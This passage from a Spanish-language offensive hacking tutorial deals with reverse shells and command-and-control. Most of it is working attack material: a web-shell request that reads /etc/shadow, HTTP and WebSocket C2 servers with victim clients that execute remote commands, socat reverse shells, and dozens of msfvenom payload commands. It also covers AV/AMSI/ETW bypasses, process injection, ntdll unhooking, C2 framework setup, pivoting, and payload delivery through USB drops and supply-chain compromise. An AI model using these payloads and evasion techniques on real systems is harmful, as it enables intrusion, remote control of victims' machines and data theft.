curl "http://victima.com/shell.php?cmd=cat%20/etc/shadow"
```

### 8.3 [python](../raw/pyth0n-f0r-h4ck1ng.md) HTTPS server con control

```python
# http_c2.py — servidor HTTP que recibe conexiones
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, subprocess

class C2Handler(BaseHTTPRequestHandler):
    results = []
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)
        
        if 'output' in data:
            print(f"[Result] {data['output']}")
            self.results.append(data['output'])
        
        if 'cmd' in data:
            # Pedir comando
            print(f"[+] Check-in from {self.client_address}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'{"status":"ok","cmd":"whoami"}')
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'C2 Server Running')

server = HTTPServer(('0.0.0.0', 8080), C2Handler)
print('[*] C2 HTTP Server on :8080')
server.serve_forever()
```

```python
# http_client.py — cliente en la víctima
import requests, subprocess, json, time

SERVER = 'http://10.0.0.1:8080'

while True:
    try:
        r = requests.post(f'{SERVER}/checkin', 
                         json={'host': subprocess.check_output('hostname').decode().strip()},
                         timeout=10)
        cmd = r.json().get('cmd', '')
        
        if cmd and cmd != 'none':
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            requests.post(f'{SERVER}/result',
                         json={'output': output.decode()})
    except:
        pass
    time.sleep(5)
```

---

## 9. WebSocket Shells

Los WebSockets son difíciles de inspeccionar porque el tráfico es binario y usa [http](../raw/r3d3s-f0nd4m3nt0s.md#http) upgrade.

```python
# Servidor WebSocket (atacante)
# pip install websockets
import asyncio
import websockets
import subprocess

async def handle(websocket, path):
    async for message in websocket:
        result = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT)
        await websocket.send(result.decode())

start_server = websockets.serve(handle, "0.0.0.0", 4444)
asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
```

```javascript
// Cliente WebSocket (en la víctima, en Node.js)
// node client.js
const WebSocket = require('ws');
const { exec } = require('child_process');

const ws = new WebSocket('ws://10.0.0.1:4444');
ws.on('open', () => console.log('Connected'));
ws.on('message', (cmd) => {
    exec(cmd.toString(), (err, stdout, stderr) => {
        ws.send(stdout + stderr);
    });
});
ws.on('close', () => setTimeout(() => process.exit(), 5000));
```

---

## 10. Windows Named Pipe Shells

Las named pipes son el mecanismo de IPC de Windows. Se pueden usar para shells laterales.

```powershell
# Servidor named pipe (víctima)
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream('evilpipe', 'Out')
$pipe.WaitForConnection()
$writer = New-Object System.IO.StreamWriter($pipe)
$reader = New-Object System.IO.StreamReader($pipe)

while ($true) {
    $cmd = $reader.ReadLine()
    $result = Invoke-Expression $cmd 2>&1
    $writer.WriteLine($result)
    $writer.Flush()
}
```

```powershell
# Cliente named pipe (atacante local)
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.', 'evilpipe', 'In')
$pipe.Connect()
$reader = New-Object System.IO.StreamReader($pipe)
$reader.ReadLine()  # leer resultado
```

---

## 11. [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) Reverse Shells

Cuando hay puertos compartidos SMB (445), podés tunelizar la shell.

```bash
# === SMB exec con Impacket ===

# En el atacante (si tenés credenciales):
impacket-smbexec DOMAIN/User:Password@10.0.0.1
impacket-psexec DOMAIN/User:Password@10.0.0.1

# Sin credenciales, si SMB guest/anon está habilitado:
smbclient //10.0.0.1/C$ -N
```

---

## 12. Shell Stabilization — Mejora de TTY

Una [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) básica es frágil: no tiene autocompletado, no responde Ctrl+C, no tiene historial.

### 12.1 [python](../raw/pyth0n-f0r-h4ck1ng.md) PTY (Linux)

```bash
# 1. En la reverse shell:
python -c 'import pty; pty.spawn("/bin/bash")'
# o
python3 -c 'import pty; pty.spawn("/bin/bash")'
# o
script -q /dev/null

# 2. Background la shell: Ctrl+Z

# 3. En tu terminal local:
stty raw -echo; fg

# 4. Ya de vuelta en la shell:
reset
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows <filas> columns <columnas>

# 5. Verificar tamaño de tu terminal local:
stty size
# Ej: 24 80 → rows=24, columns=80
# En la shell remota:
stty rows 24 columns 80
```

### 12.2 [socat](../raw/r3v3rs3-sh3lls.md#socat) TTY completo

```bash
# En el atacante (listener con TTY):
socat file:`tty`,raw,echo=0 TCP-L:4444

# En la víctima:
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
# Esto ya da una shell completamente interactiva sin pasos extra
```

### 12.3 Expect script

```bash
# expect — script que spawna una shell interactiva
#!/usr/bin/expect -f
set timeout -1
spawn /bin/bash
send "exec script -q /dev/null\r"
interact
```

### 12.4 Screen / Tmux en la víctima

```bash
# Si screen o tmux están instalados en la víctima:
screen -S revive
# Ctrl+A, D para desprender
screen -r revive  # reaprender

# Con tmux:
tmux new-session -s revive
tmux attach -t revive
```

### 12.5 Windows shell upgrade

```powershell
# PowerShell tiene buena interactividad por defecto
# Pero si querés mejorarla:
# Usar ConPTY (Console PTY) en Windows 10+
$host.UI.RawUI.ForegroundColor = "Green"
$host.UI.RawUI.WindowTitle = "Shell"

# Para netsh + port forwarding (si estás en Windows y querés RDP):
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=127.0.0.1
```

---

## 13. msfvenom — Generación de Payloads

### 13.1 Linux payloads

```bash
# ELF ejecutable
msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# ELF meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o meter.elf

# ELF staged vs stageless
# staged (shell/reverse_tcp): payload chico, descarga el stage
# stageless (shell_reverse_tcp): payload grande, ya incluye todo
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o stageless.elf

# ELF HTTPS
msfvenom -p linux/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f elf -o meter.elf

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.1 LPORT=4444 -o shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=10.0.0.1 LPORT=4444 -o shell.pl
```

### 13.2 Windows payloads

```bash
# EXE ejecutable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# EXE meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o meter.exe

# EXE HTTPS (evasivo)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o meter.exe

# PowerShell reflection
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-reflection -o payload.ps1

# PowerShell cmd
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-cmd -o payload.bat

# VB Script
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f vba -o payload.vba

# C# (para usar con donut)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f csharp -o payload.cs

# Macro de Office
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f vba -o macro.vba

# HTM (IE exploit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hta-psh -o payload.hta

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o payload.dll

# MSI (Windows Installer)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o payload.msi
```

### 13.3 Mobile payloads

```bash
# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o evil.apk
# O con persistencia:
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o evil.apk -P android/wakelock

# iOS (requiere firmar)
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o evil.ipa
```

### 13.4 Web payloads

```bash
# PHP
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -o shell.php

# PHP meterpreter
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war
```

### 13.5 Encoders y evasión

```bash
# Xor encoder (básico)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/xor -i 5 -f exe -o encoded.exe

# Xor dinámico
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/xor_dynamic -i 3 -f exe -o encoded.exe

# Zutto decrement (evasivo)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/zutto_dekiru -i 2 -f exe -o encoded.exe

# Shikata ga nai (el encoder más famoso)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Evasión con templates
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -x /usr/share/windows-binaries/plink.exe -k -f exe -o plink_payload.exe
# -x = template exe (el payload se inyecta en un binario legítimo)
# -k = mantener funcionalidad original
```

---

## 14. [payload](../raw/m3t4spl01t.md#payloads) Obfuscation — Ofuscación Avanzada

### 14.1 [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) obfuscation

```powershell
# 1. String manipulation
$c='Ne';$d='w-O';$e='bje';$f='ct ';$g='Net';$h='.So';$i='cke';$j='t.T';$k='CPCl';$l='ient';
$cmd = "$c$d$e$f$g$h$i$j$k$l"
Invoke-Expression $cmd

# 2. Base64 encoding
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAPQAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJABzAGIAPQAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAcwBiADIAPQAkAHMAYgArACcAUABTAD4AIAAnADsAJABzAGIAdAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAUwB0AHIAaQBuAGcAcwAoACQAcwBiADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiAHQALAAwACwAJABzAGIAdAAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAAoA'))

# 3. Compression
$code = @"
... reverse shell code ...
"@
$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
$writer = New-Object System.IO.StreamWriter($cs)
$writer.Write($code)
$writer.Close()
$compressed = [System.Convert]::ToBase64String($ms.ToArray())

# Descomprimir y ejecutar en la víctima
$compressed = "..."
$ms = New-Object System.IO.MemoryStream([System.Convert]::FromBase64String($compressed))
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$reader = New-Object System.IO.StreamReader($cs)
IEX($reader.ReadToEnd())

# 4. AMSI bypass + obfuscated
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```

### 14.2 Custom shellcode con donut

```bash
# Donut — .NET assembly → shellcode
# Descargar: https://github.com/TheWover/donut

# Convertir payload C# a shellcode
donut -i payload.exe -o payload.bin

# Convertir con parámetros
donut -i payload.exe -o payload.bin -a 2 -f 7 -b 1
# -a 2 = amd64
# -f 7 = bin file
# -b 1 = bypass AMSI

# Cargar shellcode con PowerShell
$bytes = [System.IO.File]::ReadAllBytes("payload.bin")
$sc = [System.Convert]::ToBase64String($bytes)
```

### 14.3 Packers / Crypters

```bash
# UPX (packer)
upx -9 shell.exe -o packed.exe

# UPX con anti-debug
upx --brute shell.exe --force

# ConfuserEx (.NET obfuscator)
# https://github.com/mkaring/ConfuserEx

# Shellter (inyector en binarios legítimos)
shellter --mode auto --target C:\Windows\System32\notepad.exe

# Veil (payload generator)
veil
> use 1  # Evasion
> list   # listar payloads
> use 1  # python/shellcode_inject
> set LHOST 10.0.0.1
> set LPORT 4444
> generate

# HoaxShell (shellcode injector)
# https://github.com/secretsquirrel/the-backdoor-factory
```

---

## 15. Antivirus Evasion — Estrategias Avanzadas

### 15.1 [process injection](../raw/3dr-3v4s10n.md#process-injection)

```powershell
# PowerShell process injection básico
$bytes = [System.Convert]::FromBase64String("...shellcode base64...")
$procid = (Get-Process -Name explorer).Id
$sc = [Byte[]]$bytes
$wc = New-Object System.Net.WebClient

# Usar Win32 API calls
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class API {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

# Inyectar en explorer.exe
$hProcess = [API]::OpenProcess(0x1F0FFF, $false, $procid)
$addr = [API]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
[UIntPtr] $bytesWritten = 0
[API]::WriteProcessMemory($hProcess, $addr, $sc, $sc.Length, [ref] $bytesWritten)
[API]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
```

### 15.2 API Unhooking

```c
// unhook.c — restaurar ntdll.dll original desde disco
#include <windows.h>
#include <stdio.h>

int main() {
    // Cargar ntdll.dll desde disco (no desde memoria)
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                                GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
    
    HANDLE hMapping = CreateFileMapping(hFile, NULL, 
                                         PAGE_READONLY, 0, 0, NULL);
    LPVOID freshDll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    
    // Obtener dirección de ntdll.dll en memoria
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHeader->e_lfanew);
    
    // Calcular tamaño y copiar sección .text original sobre la hookeada
    DWORD textSize = ntHeaders->OptionalHeader.SizeOfCode;
    DWORD oldProtect;
    VirtualProtect(hNtdll, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Encontrar sección .text en la copia fresca
    // Copiar sobre la versión hookeada
    memcpy(hNtdll, freshDll, textSize);
    
    VirtualProtect(hNtdll, textSize, oldProtect, &oldProtect);
    
    CloseHandle(hFile);
    return 0;
}
```

### 15.3 Direct Syscalls

```assembly
; syscall.asm — llamada directa al kernel sin pasar por ntdll.dll
; (bypasea hooks de EDR/AV en ntdll)
.code
NtCreateProcess PROC
    mov r10, rcx
    mov eax, 0C2h  ; syscall number for NtCreateProcess
    syscall
    ret
NtCreateProcess ENDP

NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h   ; syscall number
    syscall
    ret
NtAllocateVirtualMemory ENDP

NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, 3Ah   ; syscall number
    syscall
    ret
NtWriteVirtualMemory ENDP

NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, 0C2h
    syscall
    ret
NtCreateThreadEx ENDP
end
```

```bash
# Compilar con MASM/ML64
ml64 /c syscall.asm
# Enlazar con el payload que hace syscalls directas

# Herramientas para encontrar syscall numbers:
# https://j00ru.vexillium.org/syscalls/nt/64/
```

### 15.4 [amsi](../raw/3dr-3v4s10n.md#amsi) / [etw](../raw/3dr-3v4s10n.md#etw) / WLDP bypass

```powershell
# AMSI bypass (parche en memoria)
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Otro AMSI bypass (más agresivo)
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),0)

# ETW bypass
$etw = [Ref].Assembly.GetType('System.Diagnostics.Tracing.EventProvider')
$etw.GetField('m_enabled','NonPublic,Instance').SetValue($etw.GetField('m_enabled','NonPublic,Instance').GetValue($null),0)

# WLDP bypass
Set-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0
```

### 15.5 Cómo testear evasión

```bash
# Subir a VirusTotal → NO (el sample queda público)
# Mejor usar:
# 1. Antiscan.me → https://antiscan.me (anónimo)
# 2. VirusTotal Enterprise (si tenés)
# 3. Local VMs con Defender, CrowdStrike, SentinelOne
# 4. EDR Telemetry Test → con tus propias VMs

# Test local con Defender:
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File .\payload.exe

# Con AMSI en PowerShell:
$session = [AMSITest]::new()  # si está disponible
```

---

## 16. [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) Frameworks — Centro de Comando y Control

### 16.1 Comparativa detallada

| Framework | Lenguaje | Plataformas | UI | [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) | post-[exploit](../raw/m3t4spl01t.md#post-explotacion) | Precio |
|-----------|----------|-------------|-----|---------|-------------|--------|
| **[metasploit](../raw/m3t4spl01t.md)** | Ruby | Linux/Windows/Mac | CLI + Web | [aes](../raw/crypt0-f0r-h4ck3rs.md#aes) | Completo | Gratis |
| **[cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike)** | Java/Go | Windows | GUI | AES+[rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa) | Completo | $$$$ |
| **Sliver** | Go | Linux/Windows/Mac | CLI + Web | mTLS/[http](../raw/r3d3s-f0nd4m3nt0s.md#http)(S)/[dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) | Creciente | Gratis |
| **Havoc** | Go/C | Windows | GUI | AES | Moderado | Gratis |
| **[covenant](../raw/r3v3rs3-sh3lls.md#covenant)** | .NET/C# | Windows | Web | AES | .NET | Gratis |
| **Mythic** | [python](../raw/pyth0n-f0r-h4ck1ng.md) | Multi-agente | Web | AES | Modular | Gratis |
| **Brute Ratel** | Go | Windows | GUI | RSA+AES | Avanzado | $$$ |
| **Nighthawk** | C | Windows | GUI | AES | Avanzado | $$$$ |
| **PoshC2** | [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) | Windows | CLI | AES | [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) | Gratis |
| **Merlin** | Go | Multi | CLI | HTTP/2+gRPC | Básico | Gratis |

### 16.2 Sliver — Setup completo

```bash
# === Instalación ===
git clone https://github.com/BishopFox/sliver.git
cd sliver
make

# O descargar release:
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux.zip
unzip sliver-server_linux.zip
sudo ./sliver-server install

# === Iniciar servidor ===
sliver-server

# === Comandos básicos ===

# Generar un implant (payload)
sliver > generate --mtls 10.0.0.1 --save implant.exe
sliver > generate --http 10.0.0.1:8080 --save implant.exe
sliver > generate --dns tu-dominio.com --save implant_dns.exe

# Tipos de implants:
# --mtls  → mTLS (recomendado, cifrado mutuo)
# --http  → HTTP(S) poll
# --dns   → DNS tunneling
# --wg    → WireGuard tunnel

# Opciones de generación:
generate --mtls 10.0.0.1 --save implant.exe \
  --days 365 \           # duración del certificado
  --skip-symbols \        # quitar símbolos
  --limit-errors \        # limitar errores
  --max-errors 100 \      # max errores antes de salir
  --reconnect 60 \        # reconectar cada 60s
  --debug                 # modo debug

# Iniciar listeners
sliver > mtls                          # listener mTLS en 443
sliver > https --lport 443 --domain    # HTTPS listener
sliver > dns --lport 53                # DNS listener

# === Cliente ===
# En otra terminal:
sliver-client

# Comandos en el cliente:
sliver > sessions              # listar sesiones activas
sliver > use <session-id>      # seleccionar sesión
sliver (IMPLANT) > shell       # obtener shell
sliver (IMPLANT) > screenshot  # capturar pantalla
sliver (IMPLANT) > whoami      # identidad
sliver (IMPLANT) > ls          # listar directorio
sliver (IMPLANT) > cd          # cambiar directorio
sliver (IMPLANT) > upload      # subir archivo al target
sliver (IMPLANT) > download    # bajar archivo del target
sliver (IMPLANT) > ps          # listar procesos
sliver (IMPLANT) > procdump    # dump de proceso (para mimikatz)
sliver (IMPLANT) > execute-assembly  # ejecutar .NET assembly

# === Post-explotación ===
sliver (IMPLANT) > pivots                  # configurar pivot
sliver (IMPLANT) > socks5                  # iniciar proxy SOCKS5
sliver (IMPLANT) > portfwd add -r 3389     # port forward a RDP
sliver (IMPLANT) > jail                     # aislar implant
sliver (IMPLANT) > armory                  # descargar extensiones
```

### 16.3 Havoc C2

```bash
# === Instalación ===
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc
make

# === Configuración ===
# Editar: client/Config.json, teamserver/Config.json

# === Iniciar ===
# Terminal 1: Teamserver
./Havoc/teamserver

# Terminal 2: Client
./Havoc/client

# === Características ===
# - Interfaz similar a Cobalt Strike
# - SMB, TCP, HTTPS listeners
# - Shellcode injection
# - DLL sideloading
# - Process injection
# - Token manipulation
# - MiniDump (LSASS)
# - Ejecutar .NET assemblies
# - Bypass UAC
```

### 16.4 Covenant C2

```bash
# === Instalación ===
git clone https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet run

# === Setup ===
# 1. Crear usuario admin
# 2. Crear listener (HTTP/HTTPS/Bridge)
# 3. Crear Grunt (payload)
# 4. Generar y ejecutar

# === Tipos de Grunts ===
# - HTTP Grunt
# - SMB Grunt (pivot)
# - Bridge Grunt (a través de otro Grunt)
# - InstallUtil Grunt
# - MSBuild Grunt
# - Wmic Grunt

# === Comandos útiles ===
# Shell interactiva
# Mimikatz (logonpasswords, samdump)
# SharpSploit (token, process, etc)
# Seatbelt (enumeración Windows)
# Rubeus (Kerberos abuse)
# SharpDPAPI (credenciales)
```

### 16.5 Mythic C2

```bash
# === Instalación ===
git clone https://github.com/its-a-feature/Mythic
cd Mythic
./mythic_cli.sh install

# === Agentes disponibles ===
# - Apollo (Windows, .NET)
# - Poseidon (macOS)
# - Atlas (Linux, cross-platform)
# - Hermes (Python)

# === Características ===
# - Web UI completa
# - Payloads dinámicos
# - Plugin system
# - Task tracking
# - File browser
# - Screenshots
# - Keylogging
# - Clipboard monitoring
```

---

## 17. Egress Filtering — Bypass de [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) de Salida

Muchas [redes](../raw/r3d3s-f0nd4m3nt0s.md) bloquean puertos no estándar. Estrategias para saltarlos:

```bash
# 1. Usar puertos comunes (80, 443, 53, 22, 21)
# Estos suelen estar abiertos porque son necesarios para operar

# 2. HTTP/HTTPS reverse shell
# Como el payload se envía sobre HTTP, pasa por proxy
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o meter.exe

# 3. DNS tunneling (ver sección 6)
# DNS siempre está abierto

# 4. WebSocket (ver sección 9)
# Pasa por HTTP/S ports

# 5. Domain fronting
# Usar CDN (Cloudflare, Akamai) para esconder el C2 real
# Host header → C2 real
# SNI → CDN
# El firewall ve conexión a CDN legítimo

# 6. Proxy aware payloads
# Algunos frameworks detectan proxy y lo usan automáticamente

# 7. SSH tunneling sobre 443
# Si SSH está permitido y hay un servidor SSH en 443:
ssh -R 4444:localhost:4444 user@SSH_SERVER -p 443

# 8. Detectando si hay egress filtering:
# Probar conexiones salientes a varios puertos:
timeout 2 bash -c 'echo >/dev/tcp/8.8.8.8/53' && echo "DNS open"
timeout 2 bash -c 'echo >/dev/tcp/8.8.8.8/80' && echo "HTTP open"
timeout 2 bash -c 'echo >/dev/tcp/8.8.8.8/443' && echo "HTTPS open"
timeout 2 bash -c 'echo >/dev/tcp/8.8.8.8/22' && echo "SSH open"
timeout 2 bash -c 'echo >/dev/tcp/8.8.8.8/4444' && echo "Custom open"
```

---

## 18. [pivoting](../raw/l1n9x-pr1v3sc.md#pivoting) — Movimiento Lateral

Una vez que comprometés un host, podés usarlo como trampolín para atacar otros segmentos de [red](../raw/r3d3s-f0nd4m3nt0s.md).

### 18.1 [metasploit](../raw/m3t4spl01t.md) pivot

```bash
# Cuando ganás una session meterpreter:
meterpreter > background
msf6 > route add 10.10.10.0 255.255.255.0 1
# Ahora todos los módulos de MSF pueden atacar la red 10.10.10.0/24 a través de session 1

# Con autoroute (automático):
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -p  # ver rutas

# Port forwarding local:
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.50
# Ahora rdesktop localhost:3389 conecta a 10.10.10.50:3389
```

### 18.2 SOCKS [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) con sliver

```bash
sliver (IMPLANT) > socks5 start
# Configurar proxychains:
# nano /etc/proxychains.conf
# socks5 127.0.0.1 1080

# Usar con herramientas:
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains xfreerdp /u:admin /v:10.10.10.50
```

### 18.3 SSH tunneling

```bash
# Local port forward (atacante → víctima → red interna)
ssh -L 8080:internal-server:80 user@pivot-host

# Remote port forward (red interna → atacante)
ssh -R 4444:localhost:4444 user@pivot-host

# Dynamic port forward (SOCKS proxy)
ssh -D 1080 user@pivot-host
# proxychains cualquier-herramienta
```

### 18.4 [ligolo](../raw/l1n9x-pr1v3sc.md#ligolo-ng)-ng (el mejor para pivoting)

```bash
# === Setup ===
# Descargar: https://github.com/nicocha30/ligolo-ng

# En el atacante (proxy):
sudo ip tuntap add name ligolo mode tun
sudo ip link set ligolo up
sudo ip addr add 240.0.0.1/32 dev ligolo
./proxy -selfcert

# En la víctima (agent):
./agent -connect 10.0.0.1:11601 -ignore-cert

# En el proxy:
ligolo-ng > session
ligolo-ng > ifconfig  # ver interfaces de la sesión
ligolo-ng > start     # iniciar túnel
# Agregar ruta a la red interna
sudo ip route add 10.10.10.0/24 dev ligolo
```

---

## 19. Delivery Methods — Cómo entregar el [payload](../raw/m3t4spl01t.md#payloads)

```bash
# 1. Web download
python3 -m http.server 8000
# Víctima: wget/curl http://atacante:8000/payload.exe

# 2. SMB share
sudo impacket-smbserver share .
# Víctima: \\atacante\share\payload.exe

# 3. Email con adjunto
# Ver tutorial de phishing para métodos

# 4. USB drop
# Dejar USBs con payloads en estacionamiento/oficina

# 5. Watering hole
# Infectar sitio web que la víctima visita frecuentemente

# 6. Drive-by download
# Explotar navegador para descargar automáticamente

# 7. Supply chain attack
# Infectar software que la víctima va a instalar

# 8. Social engineering directa
# "Hola, soy de IT. Necesito que ejecutes este programa para actualizar"
```

---

## 20. Recursos y Referencias

- **[reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) Cheat Sheet**: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- **GTFOBins**: https://gtfobins.github.io/ (binarios que pueden reverse shell)
- **LOLBas**: https://lolbas-project.github.io/ (Windows living off the land)
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **Sliver**: https://github.com/BishopFox/sliver
- **Havoc**: https://github.com/HavocFramework/Havoc
